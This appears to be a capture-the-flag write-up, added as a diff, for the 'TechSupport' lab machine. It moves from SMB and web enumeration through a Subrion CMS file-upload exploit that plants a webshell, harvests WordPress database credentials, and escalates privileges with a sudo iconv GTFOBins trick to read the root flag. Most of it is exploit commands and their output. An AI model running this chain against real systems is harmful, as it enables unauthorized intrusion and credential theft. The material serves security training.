@@ -1,0 +1,215 @@
+nmap
+```
+└─$ sudo nmap -Pn -sV 10.10.127.115
+[sudo] password for gomez22: 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 13:14 PDT
+Nmap scan report for 10.10.127.115
+Host is up (0.16s latency).
+Not shown: 996 closed tcp ports (reset)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))                           
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)              
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)              
+Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel                
+                                                                                          
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 26.47 seconds 
+```
+
+smbclient
+```
+─$ smbclient -L 10.10.127.115
+Enter WORKGROUP\gomez22's password: 
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        websvr          Disk      
+        IPC$            IPC       IPC Service (TechSupport server (Samba, Ubuntu))
+
+
+
+└─$ smbclient \\\\10.10.127.115\\websvr                                                                                                 
+Enter WORKGROUP\gomez22's password: 
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Sat May 29 00:17:38 2021
+  ..                                  D        0  Sat May 29 00:03:47 2021
+  enter.txt                           N      273  Sat May 29 00:17:38 2021
+
+                8460484 blocks of size 1024. 5697356 blocks available
+smb: \> get enter.txt
+getting file \enter.txt of size 273 as enter.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
+
+```
+
+enter.txt
+```
+└─$ cat enter.txt
+GOALS
+=====
+1)Make fake popup and host it online on Digital Ocean server
+2)Fix subrion site, /subrion doesn't work, edit from panel
+3)Edit wordpress website
+
+IMP
+===
+Subrion creds
+|->admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk [cooked with magical formula]
+Wordpress creds
+|->
+```
+
+Cyberchef for password hash
+From `Base58` -> `Base32` -> `Base64`
+Creds: `admin:Scam2021`
+
+gobuster 
+```
+└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,js -u 10.10.127.115
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.127.115
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt,js
+[+] Timeout:                 10s
+===============================================================
+2022/06/30 13:17:29 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.hta.php             (Status: 403) [Size: 278]
+/.hta.html            (Status: 403) [Size: 278]
+/.hta.txt             (Status: 403) [Size: 278]
+/.hta.js              (Status: 403) [Size: 278]
+/.htaccess.php        (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/.htaccess.html       (Status: 403) [Size: 278]
+/.htpasswd.php        (Status: 403) [Size: 278]
+/.htaccess.txt        (Status: 403) [Size: 278]
+/.htpasswd.html       (Status: 403) [Size: 278]
+/.htaccess.js         (Status: 403) [Size: 278]
+/.htpasswd.txt        (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/.htpasswd.js         (Status: 403) [Size: 278]
+/index.html           (Status: 200) [Size: 11321]
+/index.html           (Status: 200) [Size: 11321]
+/phpinfo.php          (Status: 200) [Size: 94945]
+/phpinfo.php          (Status: 200) [Size: 94945]
+/server-status        (Status: 403) [Size: 278]  
+/test                 (Status: 301) [Size: 313] [--> http://10.10.127.115/test/]
+/wordpress            (Status: 301) [Size: 318] [--> http://10.10.127.115/wordpress/]
+
+```
+
+From previous CTF experience, I went to 10.10.127.115/wordpress/wp-login.php to see if a login page was present. I checked this out while I enumerated the /wordpress pages.
+The creds don't work for ssh or on wp-login.php
+
+wpscan
+```
+[+] URL: http://10.10.127.115/wordpress/ [10.10.127.115]
+[+] Started: Thu Jun 30 13:35:33 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.127.115/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://10.10.127.115/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://10.10.127.115/wordpress/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+
+```
+
+The /subrion link doesn't work. The note says to try `http://10.10.127.115/subrion/panel/`
+Found a new login page. Let's try the creds again, and save this piece of info (`Powered by Subrion CMS v4.2.1`) for a spearchsploit run.
+
+We have a successful login!
+Searchsploit gave me this interesting result: `Subrion CMS 4.2.1 - Arbitrary File Upload | php/webapps/49876.py`
+
+```
+└─$ python3 49876.py -u http://10.10.127.115/subrion/panel/ -l admin -p Scam2021
+[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 
+
+[+] Trying to connect to: http://10.10.127.115/subrion/panel/
+[+] Success!
+[+] Got CSRF token: NvmogHaejtpsqm8veQtpp4lrKxv2a6U4E36KVfnF
+[+] Trying to log in...
+[+] Login Successful!
+
+[+] Generating random name for Webshell...
+[+] Generated webshell name: uqxxdbtwhxmbvak
+
+[+] Trying to Upload Webshell..
+[+] Upload Success... Webshell path: http://10.10.127.115/subrion/panel/uploads/uqxxdbtwhxmbvak.phar 
+
+```
+
+linpeas.sh output
+```
+╔══════════╣ Analyzing Wordpress Files (limit 70)
+-rwxr-xr-x 1 www-data www-data 2992 May 29  2021 /var/www/html/wordpress/wp-config.php                                                                        
+define( 'DB_NAME', 'wpdb' );
+define( 'DB_USER', 'support' );
+define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
+define( 'DB_HOST', 'localhost' );
+
+```
+
+Logged in to wp-login.php
+using `support:ImAScammerLOL!123!`. Couldn't find much, tried to do another reverse shell using the 404.php
+in a vulnerable theme trick, but no dice.
+
+We had the user `scamsite` in /home when I had the first reverse shell up. I will try to ssh in as
+`scamsite:ImAScammerLOL!123!`...and we're in.
+```
+scamsite@TechSupport:~$ sudo -l
+Matching Defaults entries for scamsite on TechSupport:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User scamsite may run the following commands on TechSupport:
+    (ALL) NOPASSWD: /usr/bin/iconv
+
+```
+Let's consult gtfobins for iconv
+```
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
+    LFILE=file_to_read
+    ./iconv -f 8859_1 -t 8859_1 "$LFILE"
+
+
+```
+
+so we set LFILE to `/root/root.txt` and we should be golden. Let's give it a run!
+```
+scamsite@TechSupport:~$ LFILE=/root/root.txt
+scamsite@TechSupport:~$ sudo /usr/bin/iconv -f 8859_1 8859_1 "$LFILE"
+/usr/bin/iconv: cannot open input file `8859_1': No such file or directory
+851b8233a8c09400ec30651bd1529bf1ed02790b  -
+```
+
+This looks like a flag to me!
